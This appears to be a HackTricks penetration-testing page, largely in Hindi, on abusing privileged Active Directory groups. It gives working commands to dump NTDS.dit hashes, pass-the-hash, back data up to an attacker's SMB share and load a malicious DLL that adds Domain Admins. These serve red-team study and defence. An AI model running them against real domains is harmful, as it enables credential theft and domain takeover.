# विशेषाधिकार समूह

{{#include ../../banners/hacktricks-training.md}}

## प्रशासनिक विशेषाधिकार वाले ज्ञात समूह

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

यह समूह डोमेन पर administrators न होने वाले खातों और समूहों को बनाने का अधिकार रखता है। इसके अतिरिक्त, यह Domain Controller (DC) पर स्थानीय लॉगिन सक्षम करता है।

इस समूह के सदस्यों की पहचान करने के लिए निम्नलिखित कमांड चलाया जाता है:
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
नए उपयोगकर्ताओं को जोड़ना अनुमति है, साथ ही DC पर स्थानीय रूप से लॉगिन भी अनुमति है।

## AdminSDHolder समूह

**AdminSDHolder** समूह की Access Control List (ACL) महत्वपूर्ण है क्योंकि यह Active Directory के भीतर सभी "protected groups" के लिए permissions सेट करती है, जिसमें high-privilege groups भी शामिल हैं। यह mechanism इन समूहों की सुरक्षा सुनिश्चित करता है और unauthorized modifications को रोकता है।

एक attacker इसका फायदा उठा सकता है: **AdminSDHolder** समूह की ACL को modify करके एक standard user को full permissions देकर। इससे प्रभावी रूप से उस user को सभी protected groups पर full control मिल जाएगा। यदि उस user की permissions बदल दी जाती हैं या हटा दी जाती हैं, तो system की design के कारण वे स्वचालित रूप से एक घंटे के भीतर पुनर्स्थापित हो जाएंगे।

हाल की Windows Server दस्तावेज़ीकरण कई built-in operator समूहों को अभी भी **protected** objects के रूप में मानता है (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins`, इत्यादि)। **SDProp** process default रूप से हर 60 मिनट पर **PDC Emulator** पर चलता है, `adminCount=1` stamp करता है, और protected objects पर inheritance को disable कर देता है। यह persistence के लिए और उन stale privileged users का पता लगाने के लिए उपयोगी है जिन्हें protected group से हटाया गया था पर फिर भी non-inheriting ACL बनाए हुए हैं।

सदस्यों की समीक्षा करने और permissions बदलने के लिए commands में शामिल हैं:
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
Select-Object distinguishedName
```
पुनर्स्थापना प्रक्रिया को तेज़ करने के लिए एक स्क्रिप्ट उपलब्ध है: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

अधिक जानकारी के लिए जाएँ: [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).

## AD Recycle Bin

इस समूह की सदस्यता हटाए गए Active Directory ऑब्जेक्ट्स को पढ़ने की अनुमति देती है, जो संवेदनशील जानकारी उजागर कर सकती है:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
यह **recovering previous privilege paths** के लिए उपयोगी है। हटाए गए ऑब्जेक्ट्स अभी भी `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, पुराने SPNs, या उस हटाए गए विशेषाधिकार प्राप्त समूह का DN उजागर कर सकते हैं जिसे बाद में किसी अन्य ऑपरेटर द्वारा पुनर्स्थापित किया जा सकता है।
```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
-Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```
### Domain Controller Access

DC पर फाइलों तक पहुँच सीमित रहती है जब तक उपयोगकर्ता `Server Operators` समूह का हिस्सा न हो; यह समूह पहुँच के स्तर को बदल देता है।

### Privilege Escalation

Sysinternals के `PsService` या `sc` का उपयोग करके, कोई सेवा अनुमतियों का निरीक्षण और संशोधन कर सकता है। उदाहरण के लिए, `Server Operators` समूह को कुछ सेवाओं पर full control होता है, जिससे arbitrary commands के निष्पादन और privilege escalation संभव हो जाता है:
```cmd
C:\> .\PsService.exe security AppReadiness
```
यह कमांड दर्शाता है कि `Server Operators` को पूर्ण पहुँच है, जो सेवाओं में बदलाव करके उच्च अनुमतियाँ हासिल करने में सक्षम बनाती है।

## Backup Operators

`Backup Operators` समूह की सदस्यता `DC01` फ़ाइल सिस्टम तक पहुँच प्रदान करती है, क्योंकि इसमें `SeBackup` और `SeRestore` अनुमतियाँ शामिल हैं। ये अनुमतियाँ `FILE_FLAG_BACKUP_SEMANTICS` फ़्लैग का उपयोग करके स्पष्ट अनुमतियों के बिना भी फ़ोल्डर ट्रैवर्सल, सूचीकरण और फ़ाइल कॉपी करने की क्षमताएँ सक्षम करती हैं। इस प्रक्रिया के लिए विशिष्ट स्क्रिप्ट्स का उपयोग आवश्यक है।

समूह के सदस्यों को सूचीबद्ध करने के लिए, निष्पादित करें:
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Local Attack

इन privileges का स्थानीय रूप से उपयोग करने के लिए, निम्नलिखित चरण अपनाए जाते हैं:

1. आवश्यक libraries को import करें:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. `SeBackupPrivilege` को सक्षम करें और सत्यापित करें:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. प्रतिबंधित निर्देशिकाओं से फ़ाइलों तक पहुँचें और उन्हें कॉपी करें, उदाहरण के लिए:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD हमला

Domain Controller के फ़ाइल सिस्टम तक प्रत्यक्ष पहुँच से `NTDS.dit` डेटाबेस की चोरी संभव होती है, जिसमें डोमेन उपयोगकर्ताओं और कंप्यूटरों के सभी NTLM हैश होते हैं।

#### diskshadow.exe का उपयोग

1. `C` ड्राइव की शैडो कॉपी बनाएं:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. शैडो कॉपी से `NTDS.dit` को कॉपी करें:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
वैकल्पिक रूप से, फ़ाइल कॉपी करने के लिए `robocopy` का उपयोग करें:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. हैश प्राप्त करने के लिए `SYSTEM` और `SAM` निकालें:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. `NTDS.dit` से सभी हैश प्राप्त करें:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. निष्कर्षण के बाद: Pass-the-Hash to DA
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### wbadmin.exe का उपयोग

1. हमलावर मशीन पर SMB सर्वर के लिए NTFS फ़ाइलसिस्टम सेटअप करें और लक्ष्य मशीन पर SMB क्रेडेंशियल्स को कैश करें।
2. सिस्टम बैकअप और `NTDS.dit` निष्कर्षण के लिए `wbadmin.exe` का उपयोग करें:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

व्यावहारिक प्रदर्शन के लिए देखें [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

**DnsAdmins** समूह के सदस्य अपने विशेषाधिकारों का उपयोग करके अक्सर Domain Controllers पर होस्ट किए गए DNS server पर SYSTEM विशेषाधिकारों के साथ कोई भी DLL लोड कर सकते हैं। यह क्षमता महत्वपूर्ण शोषण संभावनाएँ प्रदान करती है।

DnsAdmins समूह के सदस्यों को सूचीबद्ध करने के लिए उपयोग करें:
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### मनमाना DLL निष्पादित करना (CVE‑2021‑40469)

> [!NOTE]
> यह कमजोरी DNS service में SYSTEM privileges के साथ arbitrary code के निष्पादन की अनुमति देती है (आमतौर पर DCs के अंदर)। यह समस्या 2021 में ठीक कर दी गई थी।

सदस्य DNS server को किसी arbitrary DLL (स्थानीय रूप से या किसी remote share से) लोड करवा सकते हैं, उदाहरण के लिए निम्नलिखित commands का उपयोग करके:
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
DLL को लोड करने के लिए DNS service को पुनः आरंभ करना (जिसके लिए अतिरिक्त permissions की आवश्यकता हो सकती है) आवश्यक है:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
इस attack vector के बारे में अधिक जानकारी के लिए, ired.team देखें।

#### Mimilib.dll

mimilib.dll का उपयोग command execution के लिए भी संभव है; इसे specific commands या reverse shells चलाने के लिए modify किया जा सकता है। [Check this post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) for more information.

### WPAD रिकॉर्ड (MitM के लिए)

DnsAdmins DNS records को manipulate कर सकते हैं ताकि Man-in-the-Middle (MitM) attacks किए जा सकें; global query block list को disable करने के बाद WPAD record बनाकर यह किया जा सकता है। Responder या Inveigh जैसे tools spoofing और network traffic capture करने के लिए उपयोग किए जा सकते हैं।

### Event Log Readers

सदस्य event logs तक पहुँच सकते हैं, और संभवतः plaintext passwords या command execution विवरण जैसी sensitive जानकारी पा सकते हैं:
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows Permissions

यह समूह domain object पर DACLs को संशोधित कर सकता है, जिससे संभावित रूप से DCSync privileges प्रदान हो सकते हैं। Techniques for privilege escalation exploiting this group are detailed in Exchange-AD-Privesc GitHub repo.
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
यदि आप इस समूह के सदस्य के रूप में कार्य कर सकते हैं, तो क्लासिक दुरुपयोग यह है कि हमलावर-नियंत्रित principal को [DCSync](dcsync.md) के लिए आवश्यक replication rights प्रदान किया जाए:
```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```
Historically, **PrivExchange** chained mailbox access, coerced Exchange authentication, and LDAP relay to land on this same primitive. Even where that relay path is mitigated, direct membership in `Exchange Windows Permissions` or control of an Exchange server remains a high-value route to domain replication rights.

## Hyper-V Administrators

Hyper-V Administrators have full access to Hyper-V, which can be exploited to gain control over virtualized Domain Controllers. This includes cloning live DCs and extracting NTLM hashes from the NTDS.dit file.

### शोषण उदाहरण

व्यवहारिक दुरुपयोग आमतौर पर पुराने host-level LPE ट्रिक्स की बजाय **DC डिस्क/चेकपॉइंट्स तक ऑफ़लाइन पहुँच** होता है। Hyper-V host तक पहुँच होने पर, एक ऑपरेटर virtualized Domain Controller का checkpoint या export कर सकता है, VHDX को माउंट कर सकता है, और `NTDS.dit`, `SYSTEM`, तथा अन्य secrets को guest के अंदर LSASS को छुए बिना निकाल सकता है:
```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```
From there, reuse the `Backup Operators` workflow to copy `Windows\NTDS\ntds.dit` and the registry hives ऑफ़लाइन कॉपी करें।

## Group Policy Creators Owners

यह group domain में सदस्यों को Group Policies बनाने की अनुमति देता है। हालांकि, इसके सदस्य users या groups पर group policies लागू नहीं कर सकते या मौजूदा GPOs को edit नहीं कर सकते।

महत्वपूर्ण सूक्ष्म बात यह है कि **creator becomes owner of the new GPO** और आमतौर पर बाद में इसे edit करने के लिए पर्याप्त अधिकार प्राप्त कर लेता है। इसका मतलब यह समूह तब उपयोगी होता है जब आप निम्न में से कोई कर सकें:

- एक malicious GPO बनाएँ और एक admin को मनाएँ कि वह उसे target OU/domain से link करे
- एक GPO जिसे आपने बनाया है और जो पहले से कहीं उपयोगी जगह linked है, उसे edit करें
- किसी अन्य delegated right का दुरुपयोग करें जो आपको GPOs link करने देता है, जबकि यह समूह आपको edit करने का पक्ष देता है

व्यवहारिक दुरुपयोग आम तौर पर SYSVOL-backed policy files के जरिए एक **Immediate Task**, **startup script**, **local admin membership**, या **user rights assignment** परिवर्तन जोड़ने का होता है।
```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```
If editing the GPO manually through `SYSVOL`, remember the change is not enough by itself: `versionNumber`, `GPT.ini`, and sometimes `gPCMachineExtensionNames` must also be updated or clients will ignore the policy refresh.

## Organization Management

ऐसे वातावरण में जहाँ **Microsoft Exchange** तैनात है, एक विशेष समूह जिसे **Organization Management** कहा जाता है, उसके पास महत्वपूर्ण क्षमताएँ होती हैं। इस समूह को **सभी डोमेन उपयोगकर्ताओं के मेलबॉक्स तक पहुँच** का विशेषाधिकार मिलता है और यह **'Microsoft Exchange Security Groups'** Organizational Unit (OU) पर पूरा नियंत्रण बनाए रखता है। इस नियंत्रण में **`Exchange Windows Permissions`** समूह भी शामिल है, जिसका उपयोग privilege escalation के लिए किया जा सकता है।

### Privilege Exploitation and Commands

#### Print Operators

**Print Operators** समूह के सदस्यों को कई privileges दिए जाते हैं, जिनमें **`SeLoadDriverPrivilege`** शामिल है, जो उन्हें एक Domain Controller पर लोकल रूप से लॉग ऑन करने, उसे शटडाउन करने और प्रिंटर प्रबंधित करने की अनुमति देता है। इन privileges का शोषण करने के लिए, विशेषकर यदि **`SeLoadDriverPrivilege`** non-elevated संदर्भ में दिखाई नहीं देता है, तो User Account Control (UAC) को बाइपास करना आवश्यक होगा।

इस समूह के सदस्यों को सूचीबद्ध करने के लिए, निम्न PowerShell कमांड का उपयोग किया जाता है:
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
On Domain Controllers यह समूह खतरनाक होता है क्योंकि डिफ़ॉल्ट Domain Controller Policy **`SeLoadDriverPrivilege`** को `Print Operators` को देती है। अगर आप इस समूह के किसी सदस्य का elevated token प्राप्त कर लेते हैं, तो आप इस privilege को सक्षम कर सकते हैं और signed-but-vulnerable driver लोड करके kernel/SYSTEM पर जा सकते हैं। token हैंडलिंग विवरण के लिए, देखें [Access Tokens](../windows-local-privilege-escalation/access-tokens.md).

#### Remote Desktop Users

इस समूह के सदस्यों को Remote Desktop Protocol (RDP) के माध्यम से पीसी तक पहुँच दी जाती है। इन सदस्यों की सूची निकालने के लिए PowerShell कमांड उपलब्ध हैं:
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
exploiting RDP के बारे में और जानकारी समर्पित pentesting संसाधनों में मिल सकती है।

#### Remote Management Users

सदस्य **Windows Remote Management (WinRM)** के माध्यम से PCs तक पहुंच सकते हैं। इन सदस्यों की Enumeration निम्नलिखित तरीकों से की जा सकती है:
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
WinRM से संबंधित exploitation techniques के लिए, विशिष्ट दस्तावेज़ों का संदर्भ लें।

#### Server Operators

यह समूह Domain Controllers पर विभिन्न कॉन्फ़िगरेशन करने की अनुमति रखता है, जिसमें backup और restore privileges, सिस्टम का समय बदलना, और सिस्टम को शटडाउन करना शामिल है। सदस्यों की सूची निकालने के लिए दिया गया कमांड है:
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
Domain Controllers पर, `Server Operators` आमतौर पर पर्याप्त अधिकार विरासत में पाते हैं ताकि वे **reconfigure or start/stop services** कर सकें और उन्हें default DC policy के माध्यम से `SeBackupPrivilege`/`SeRestorePrivilege` भी मिलते हैं। व्यवहार में, यह उन्हें **service-control abuse** और **NTDS extraction** के बीच एक ब्रिज बनाता है:
```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```
यदि किसी service ACL इस समूह को change/start अधिकार देती है, तो सेवा को किसी arbitrary कमांड की ओर पॉइंट करें, इसे `LocalSystem` के रूप में शुरू करें, और फिर मूल `binPath` को पुनर्स्थापित कर दें। यदि service control लॉकडाउन है, तो ऊपर दिए गए `Backup Operators` तकनीकों पर वापस जाएँ ताकि `NTDS.dit` की कॉपी की जा सके।

## संदर्भ <a href="#references" id="references"></a>

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
- [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [https://labs.withsecure.com/tools/sharpgpoabuse](https://labs.withsecure.com/tools/sharpgpoabuse)


{{#include ../../banners/hacktricks-training.md}}
